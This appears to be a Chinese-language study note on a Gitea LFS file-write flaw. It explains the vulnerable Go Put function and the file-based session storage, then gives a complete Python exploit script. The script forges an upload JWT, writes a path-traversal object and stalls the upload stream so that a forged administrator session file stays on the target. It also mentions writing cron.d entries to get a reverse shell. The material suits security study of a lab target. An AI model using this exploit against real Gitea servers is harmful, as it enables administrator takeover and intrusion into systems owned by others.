### 学习checklist：

- go 使用`defer os.Remove(tmpPath)`删除文件时，文件可能被（条件竞争）阻塞。导致文件短时间内无法删除。存在风险。

- go 的文件写入不能像php,java一样直接写入一个shell。一般可以向/etc/cron.d/中写入一个crontab配置文件，来构造一个执行命令的定时任务。但是这个方式限制比较大，需要有反弹shell的权限，且文件写入的路径也要可控。

- 在使用文件管理session，可以通过写入一个session来获取管理员权限，也是一个好办法。



gitea PUT操作存在进行文件写入存在缺陷。

```go
// Put takes a Meta object and an io.Reader and writes the content to the store.
func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.Reader) error {
	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
	tmpPath := path + ".tmp"

	dir := filepath.Dir(path)
	// 创建路径
	if err := os.MkdirAll(dir, 0750); err != nil {
		return err
	}

	// 如果文件不存在 则创建
	file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0640)
	if err != nil {
		return err
	}
	// 最后删除文件
	defer os.Remove(tmpPath)

	hash := sha256.New()
	// 创建一个写入器
	hw := io.MultiWriter(hash, file)

	// 将r写入file
	written, err := io.Copy(hw, r)
	if err != nil {
		file.Close()
		return err
	}
	file.Close()

	if written != meta.Size {
		return errSizeMismatch
	}
	shaStr := hex.EncodeToString(hash.Sum(nil))
	if shaStr != meta.Oid {
		return errHashMismatch
	}
	// 将tmpPath 重命名为 path
	return os.Rename(tmpPath, path)
}
```

### 流程梳理

1. transformKey(meta.Oid) + .tmp后缀作为临时文件
2. 如果目录不存在，则创建目录
3. 将用户传入的内容写入临时文件
4. 如果文件大小和meta.Size不一致，则返回错误（meta.Size）是第一步中创建LFS时传入的Size参数
5. 如果文件哈希和meta.Oid不一致，则返回错误
6. 将临时文件重命名为真正的文件名

我们想要写入任意文件，Oid要定义为一个能够穿越到其他目录的恶意字符串，而一个文件的的哈希(sha256)是一个hex字符串。所以到第五步时，会失败导致退出，不可能到第六步，也就是说我们只能写入一个后缀是".tmp"的临时文件。

`defer os.Remove(tmpPath)`这条语句，最后会删除创建的临时文件。

所以需要解决两个问题：

1. 能够写入一个.tmp为后缀的文件，如何利用
2. 如何让这个文件在利用成功前不被删除

第二个问题，作者发现的方法是，条件竞争。

因为gitea是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在`io.Copy`那个步骤的，当然也就不会删除临时文件了。

### session伪造

gitea使用第三方库 [go-macaron/session](https://github.com/go-macaron/session/blob/master/file.go)来管理session，默认使用文件作为session存储容器。

Go-macaron/session session文件实现代码如下：

```go
// 文件路径
func (p *FileProvider) filepath(sid string) string {
	return path.Join(p.rootPath, string(sid[0]), string(sid[1]), sid)
}

// 将session保存到文件
// Release releases resource and save data to provider.
func (s *FileStore) Release() error {
	s.p.lock.Lock()
	defer s.p.lock.Unlock()

	data, err := EncodeGob(s.data)
	if err != nil {
		return err
	}

	return ioutil.WriteFile(s.p.filepath(s.sid), data, os.ModePerm)
}

//github.com/go-macaron/session/utils.go
// Gob序列化
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
	for _, v := range obj {
		gob.Register(v)
	}
	buf := bytes.NewBuffer(nil)
	err := gob.NewEncoder(buf).Encode(obj)
	return buf.Bytes(), err
}
```

通过查看源码可以发现：

1. session文件名格式为：rootPath/sid[0]/sid[1]/sid
2. session对象用Gob序列化后存入文件

使用p牛的脚本来生成session：

```python
import requests
import jwt
import time
import base64
import logging
import sys
import json
from urllib.parse import quote


logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)

BASE_URL = 'http://your-ip:3000/vulhub/repo'
JWT_SECRET = 'AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y'
USER_ID = 1
REPO_ID = 1
SESSION_ID = '11vulhub'
SESSION_DATA = bytes.fromhex('0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562')


def generate_token():
    def decode_base64(data):
        missing_padding = len(data) % 4
        if missing_padding != 0:
            data += '='* (4 - missing_padding)
        return base64.urlsafe_b64decode(data)

    nbf = int(time.time())-(60*60*24*1000)
    exp = int(time.time())+(60*60*24*1000)

    token = jwt.encode({'user': USER_ID, 'repo': REPO_ID, 'op': 'upload', 'exp': exp, 'nbf': nbf}, decode_base64(JWT_SECRET), algorithm='HS256')
    return token.decode()

def gen_data():
    yield SESSION_DATA
    // sleep 300秒
    time.sleep(300)
    yield b''


OID = f'....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}'
response = requests.post(f'{BASE_URL}.git/info/lfs/objects', headers={
    'Accept': 'application/vnd.git-lfs+json'
}, json={
    "Oid": OID,
    "Size": 100000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
})
logging.info(response.text)

response = requests.put(f"{BASE_URL}.git/info/lfs/objects/{quote(OID, safe='')}", data=gen_data(), headers={
    'Accept': 'application/vnd.git-lfs',
    'Content-Type': 'application/vnd.git-lfs',
    'Authorization': f'Bearer {generate_token()}'
 })
```

该脚本会在目标服务器上生存一个session文件:`11vulhub.tmp`

在300秒内携带这个session访问，即可获得管理员权限。



### 参考链接：

https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html